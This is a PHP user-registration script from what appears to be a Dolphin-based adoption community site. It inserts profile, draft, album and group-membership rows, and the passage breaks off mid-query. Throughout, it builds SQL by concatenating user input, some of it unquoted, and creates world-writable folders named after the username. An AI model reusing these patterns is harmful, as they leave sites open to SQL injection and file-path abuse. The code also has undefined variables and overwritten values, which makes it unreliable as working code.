<?php
/***********************************************************************************************

 *     Name                :  Prashanth A
 *     Date                :  Mon Nov 5 2013
 *     Purpose             :  Inserting values to the database  and assiging membership to users.

 ************************************************************************************************/
require_once '../../inc/header.inc.php';

require_once '../../inc/profiles.inc.php';

require_once '../../inc/utils.inc.php';

require_once '../../inc/db.inc.php';
bx_import('BxDolEmailTemplates');
bx_import('BxTemplFormView');
bx_import('BxDolForm');
// Getting the post values

$EmailID = test_input($_POST['emailid']);
$UserName = test_input($_POST['usern']);
$Password = test_input($_POST['passw']);
$CoupleLName = test_input($_POST['couplelname']);
$CoupleFName = test_input($_POST['couplfname']);
$CPassword = test_input($_POST['cpassw']);
$CPassword = test_input($_POST['cpassw']);
$FirstName = test_input($_POST['firstname']);
$LastFName = test_input($_POST['lastname']);
$Agency = test_input($_POST['useragency']);
$Region = test_input($_POST['userregion']);
$State = test_input($_POST['userstate']);
$CurrentDate = date('Y-m-d H:i:s');
$Profiletype = test_input($_POST['Profiletype']);
$Gender = test_input($_POST['genderfemale']);
$Gender = test_input($_POST['gendermale']);
$Cgender = test_input($_POST['cgenederfemale']);
$Cgender = test_input($_POST['cgenedermale']);
$pstatus = test_input($_POST['ptypec']);
$cpstatus = test_input($_POST['ptypes']);
$mem_type = test_input($_POST['mtype']);
$agency_title = test_input($_POST['newagency']);

$newagency = str_replace(' ', '-', $_POST['newagency']);
$agency_uri = $string = preg_replace('/[^A-Za-z0-9\-]/', '', $newagency);

// Password encryption

$sSalt = genRndSalt();
$passen = encryptUserPwd($Password, $sSalt);

// Checking Email and Username uniqueness

$tablename = 'Profiles';
$columns = 'Email';
$stringSQL_Email = "SELECT  " . $columns . " FROM " . $tablename . " where Email = '" . $EmailID . "' ";
$query_email = mysql_query($stringSQL_Email);

if (mysql_num_rows($query_email) > 0) {
	$email_error = 'The email is already in use please try another email.';
	$cmdtuples = 1;
} else {
}

$tablename = 'bx_groups_main';
$columns = 'title';
$stringSQL_title = "SELECT  " . $columns . " FROM " . $tablename . " where title = '" . $agency_title . "' ";
$query_title = mysql_query($stringSQL_title);

if (mysql_num_rows($query_title) > 0) {
	$agency_error = 'The agency name is already in use please try another agency name .';
	$cmdtuples = 1;
} else {
}

$tablename = 'Profiles';
$columns = 'NickName';
$stringSQL_Username = "SELECT  " . $columns . " FROM " . $tablename . " where NickName = '" . $UserName . "' ";
$query_username = mysql_query($stringSQL_Username);

if (mysql_num_rows($query_username) > 0) {
	// already in use?
	$username_error = 'The user name is already in use please try another user name.';
	$cmdtuples = 1;
} else {
}

// Inserting values to profile table

if ($username_error != '' || $email_error != '' || $agency_error != '') {
} else {

	// -------------------Added by Sailaja--------------------------

	$mysqli = new mysqli($db['host'], $db['user'], $db['passwd'], $db['db']);
	if (mysqli_connect_errno()) {
		printf("Connect failed: %s\n", mysqli_connect_error());
		exit();
	}
	$mysqli->autocommit(FALSE);

	// -------------------Added by Sailaja--------------------------

	if (@mysql_num_rows(mysql_query("SELECT id FROM bx_groups_main WHERE id=" . $Agency . " AND author_id=" . $Pid))) {
		$mFlag = false;
	} else {
		if (@mysql_num_rows(mysql_query("SELECT GroupId FROM bx_groups_moderation WHERE GroupId =" . $Agency . "  AND ApproveStatus= 'on' AND Type = 'profiles'"))) {
			$mFlag = true;
		} else {
			$mFlag = false;
		}
	}

	if ($mFlag) {
		$sStatusText = 'Active';
	} else {
		$sStatusText = 'Approval';
	}

	if ($pstatus == "single") {
		if ($Profiletype != 8) {

			if ($Profiletype == 4) {
				$sStatusText = 'Active';
			}
			if ($Profiletype == 2) {
				$sStatusText = 'Unconfirmed';
			}

			$all_query_ok = true;
                        $mysqli->query("SET sql_mode = '';");
			$mysqli->query("INSERT INTO `Profiles` SET `NickName` = '" . $UserName . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "', `DateReg` = '" . $CurrentDate . "',
				`DateLastEdit` = '0000-00-00', `Status` = '" . $sStatusText . "', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Gender . "', `LookingFor` = '',
				`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = 0, `Tags` = '', `zip` = '',
				`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '',
				`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '',
				`FirstName` = '" . $FirstName . "', `LastName` = '" . $LastFName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $Agency . "', `PromoCode` = '', `Region` = '" . $Region . "',
				`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '',
				`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '',
				`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '',
				`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '',
				`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '',
				`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '',
				`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '',
				`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '',
				`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';") ? null : $all_query_ok = false;
			$iNewID = $mysqli->insert_id;
                        $mysqli->query("SET sql_mode = '';");
			$mysqli->query("INSERT INTO `Profiles_draft` SET `ID` = '" . $iNewID . "', `NickName` = '" . $UserName . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "', `DateReg` = '" . $CurrentDate . "',
				`DateLastEdit` = '0000-00-00', `Status` = '" . $sStatusText . "', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Gender . "', `LookingFor` = '',
				`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = 0, `Tags` = '', `zip` = '',
				`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '',
				`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '',
				`FirstName` = '" . $FirstName . "', `LastName` = '" . $LastFName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $Agency . "', `PromoCode` = '', `Region` = '" . $Region . "',
				`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '',
				`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '',
				`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '',
				`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '',
				`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '',
				`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '',
				`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '',
				`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '',
				`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';") ? null : $all_query_ok = false;

			$all_query_ok ? $mysqli->commit() : $mysqli->rollback();

			if ($all_query_ok) {
				$group = "INSERT INTO `bx_groups_fans` SET `id_entry` = '" . $Agency . "', `id_profile` = '" . $iNewID . "' , `when` = '1372952822', `confirmed` = '1'";
				mysql_query($group);

				$albumname_user = 'Profile Pictures';
				$albumname_user_uri = 'profile-pictures';
				$created_date = time();
				$albumname_user_to = addslashes($albumname_user);

				mysql_query("INSERT INTO `sys_albums`
					(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`)
					VALUES ('$albumname_user_to', '$albumname_user_uri', 'Undefined', '', 'bx_photos', '$iNewID', 'active', $created_date, '0', '0', '3')");

				$albumname_home = 'Home Pictures';
				$albumname_home_uri = 'home-pictures';
				$created_date = time();
				$albumname_home_to = addslashes($albumname_home);

				mysql_query("INSERT INTO `sys_albums`
					(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`)
					VALUES ('$albumname_home_to', '$albumname_home_uri', 'Undefined', '', 'bx_photos', '$iNewID', 'active', $created_date, '0', '0', '3')");

				/* create video album*/
				$albumname_home = 'Home Videos';
				$albumname_home_uri = 'home-videos';
				$created_date = time();
				$albumname_home_to = addslashes($albumname_home);

				mysql_query("INSERT INTO `sys_albums`
					(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`)
					VALUES ('$albumname_home_to', '$albumname_home_uri', 'Undefined', '', 'bx_videos', '$iNewID', 'active', $created_date, '0', '0', '3')");

				if (!file_exists($dir['root'] . 'media/users/' . $UserName)) {
					mkdir($dir['root'] . 'media/users/' . $UserName, 0777, true);
				}
			}

		} else {

			$curdate = time();
			$group_query = "INSERT INTO `bx_groups_main` SET `title` = '$agency_title',`uri` = '$agency_uri',bx_groups_main.desc='',`country` = '',
			  `city` = '',`zip` = '',`status` = 'pending',`thumb` = '',`created` = '$curdate',`author_id` = '',`tags` = '',
			  `categories` = '',views= '',rate= '',rate_count= '',comments_count= '',fans_count= '',featured= '',`allow_view_group_to` = '3',
			  `allow_view_fans_to` = '3', `allow_comment_to` = 'f', `allow_rate_to` = 'f', `allow_post_in_forum_to` = 'f',
			  `allow_join_to` = '3', `join_confirmation` = '1', `allow_upload_photos_to` = 'a', `allow_upload_videos_to` = 'a',
			  `allow_upload_sounds_to` = 'a', `allow_upload_files_to` = 'a'";
			mysql_query($group_query);
			$group_id = mysql_insert_id();

			$all_query_ok = true;
                        $mysqli->query("SET sql_mode = '';");
			$mysqli->query("INSERT INTO `Profiles` SET `NickName` = '" . $UserName . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "', `DateReg` = '" . $CurrentDate . "',
				`DateLastEdit` = '0000-00-00', `Status` = 'Approval', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Gender . "', `LookingFor` = '',
				`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = 0, `Tags` = '', `zip` = '',
				`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '',
				`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '',
				`FirstName` = '" . $FirstName . "', `LastName` = '" . $LastFName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $group_id . "', `PromoCode` = '', `Region` = '" . $Region . "',
				`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '',
				`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '',
				`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '',
				`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '',
				`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '',
				`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '',
				`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '',
				`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '',
				`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';") ? null : $all_query_ok = false;
			$AUTHORID = $mysqli->insert_id;
                        $mysqli->query("SET sql_mode = '';");
			$mysqli->query("INSERT INTO `Profiles_draft` SET `ID` = '" . $AUTHORID . "', `NickName` = '" . $UserName . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "', `DateReg` = '" . $CurrentDate . "',
				`DateLastEdit` = '0000-00-00', `Status` = 'Approval', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Gender . "', `LookingFor` = '',
				`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = 0, `Tags` = '', `zip` = '',
				`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '',
				`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '',
				`FirstName` = '" . $FirstName . "', `LastName` = '" . $LastFName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $group_id . "', `PromoCode` = '', `Region` = '" . $Region . "',
				`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '',
				`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '',
				`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '',
				`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '',
				`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '',
				`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '',
				`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '',
				`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '',
				`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';") ? null : $all_query_ok = false;

			$all_query_ok ? $mysqli->commit() : $mysqli->rollback();

			if ($all_query_ok) {
				$todaysdate = time();
				$group_query = "INSERT INTO `bx_groups_fans` SET `id_entry` = '" . $group_id . "', `id_profile` = '" . $AUTHORID . "' , `when` = '$todaysdate', `confirmed` = '1'";
				mysql_query($group_query);

				$authorid_query = "Update bx_groups_main SET `author_id` = '$AUTHORID' where ID = '$group_id'";
				mysql_query($authorid_query);

				$group = "INSERT INTO `bx_groups_fans` SET `id_entry` = '" . $Agency . "', `id_profile` = '" . $iNewID . "' , `when` = '$todaysdate', `confirmed` = '1'";
				mysql_query($group);

				// Notification to agency and admin
				agencynotification($AUTHORID);

				if (!file_exists($dir['root'] . 'media/users/' . $UserName)) {
					mkdir($dir['root'] . 'media/users/' . $UserName, 0777, true);
				}

				$cmdtuples = 1;
			}

		}

		if (mysql_affected_rows() > 0) {

			if ($Profiletype != 8) {
				$user_redirect = userlogin($UserName, $Password);
			}

			if ($Profiletype == 2) {
				setMembership($iNewID, $mem_type, $iDays = 0, $bStartsNow = false, $sTransactionId = '', $isSendMail = false);
				$cmdtuples = 1;
			} elseif ($Profiletype == 4) {
				$mem_type = 6;
				setMembership($iNewID, $mem_type, $iDays = 0, $bStartsNow = false, $sTransactionId = '', $isSendMail = false);
				$cmdtuples = 1;
			} elseif ($Profiletype == 8) {
				$mem_type = 7;
				setMembership($AUTHORID, $mem_type, $iDays = 0, $bStartsNow = false, $sTransactionId = '', $isSendMail = false);
				$cmdtuples = 1;
			}
		} else {
			$user_redirect = $site['url'] . "join.php";
		}
	} else {

		if ($Profiletype == 2) {
			$sStatusText = 'Unconfirmed';
		}

		$all_query_ok = true;
//                echo $sStatusText;
//                echo "INSERT INTO `Profiles` SET `NickName` = '" . $UserName . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "', `DateReg` = '" . $CurrentDate . "',
//			`DateLastEdit` = '0000-00-00', `Status` = '" . $sStatusText . "', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Gender . "', `LookingFor` = '',
//			`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = 0, `Tags` = '', `zip` = '',
//			`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '',
//			`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '',
//			`FirstName` = '" . $FirstName . "', `LastName` = '" . $LastFName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $Agency . "', `PromoCode` = '', `Region` = '" . $Region . "',
//			`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '',
//			`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '',
//			`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '',
//			`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '',
//			`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '',
//			`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '',
//			`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '',
//			`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '',
//			`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';";
//                echo "------------------------------------------------------------------------------";
//                echo "INSERT INTO `Profiles_draft` SET `ID` = '" . $iNewID . "', `NickName` = '" . $UserName . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "', `DateReg` = '" . $CurrentDate . "',
//			`DateLastEdit` = '0000-00-00', `Status` = '" . $sStatusText . "', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Gender . "', `LookingFor` = '',
//			`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = 0, `Tags` = '', `zip` = '',
//			`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '',
//			`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '',
//			`FirstName` = '" . $FirstName . "', `LastName` = '" . $LastFName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $Agency . "', `PromoCode` = '', `Region` = '" . $Region . "',
//			`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '',
//			`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '',
//			`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '',
//			`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '',
//			`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '',
//			`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '',
//			`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '',
//			`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '',
//			`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';";
                $mysqli->query("SET sql_mode = '';");
		$mysqli->query("INSERT INTO `Profiles` SET `NickName` = '" . $UserName . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "', `DateReg` = '" . $CurrentDate . "',
			`DateLastEdit` = '0000-00-00', `Status` = '" . $sStatusText . "', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Gender . "', `LookingFor` = '',
			`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = 0, `Tags` = '', `zip` = '',
			`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '',
			`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '',
			`FirstName` = '" . $FirstName . "', `LastName` = '" . $LastFName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $Agency . "', `PromoCode` = '', `Region` = '" . $Region . "',
			`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '',
			`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '',
			`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '',
			`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '',
			`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '',
			`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '',
			`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '',
			`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '',
			`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';") ? null : $all_query_ok = false;
		$iNewID = $mysqli->insert_id;
                $mysqli->query("SET sql_mode = '';");
		$mysqli->query("INSERT INTO `Profiles_draft` SET `ID` = '" . $iNewID . "', `NickName` = '" . $UserName . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "', `DateReg` = '" . $CurrentDate . "',
			`DateLastEdit` = '0000-00-00', `Status` = '" . $sStatusText . "', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Gender . "', `LookingFor` = '',
			`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = 0, `Tags` = '', `zip` = '',
			`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '',
			`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '',
			`FirstName` = '" . $FirstName . "', `LastName` = '" . $LastFName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $Agency . "', `PromoCode` = '', `Region` = '" . $Region . "',
			`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '',
			`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '',
			`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '',
			`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '',
			`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '',
			`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '',
			`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '',
			`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '',
			`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';") ? null : $all_query_ok = false;
                $mysqli->query("SET sql_mode = '';");
		$mysqli->query("INSERT INTO `Profiles` SET `NickName` = '" . $UserName . "(2)" . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "(2)" . "', `DateReg` = '" . $CurrentDate . "',
			`DateLastEdit` = '0000-00-00', `Status` = 'Approval', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Cgender . "', `LookingFor` = '',
			`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = '" . $CCoupleID . "', `Tags` = '', `zip` = '',
			`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '',
			`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '',
			`FirstName` = '" . $CoupleFName . "', `LastName` = '" . $CoupleLName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $Agency . "', `PromoCode` = '', `Region` = '" . $Region . "',
			`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '',
			`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '',
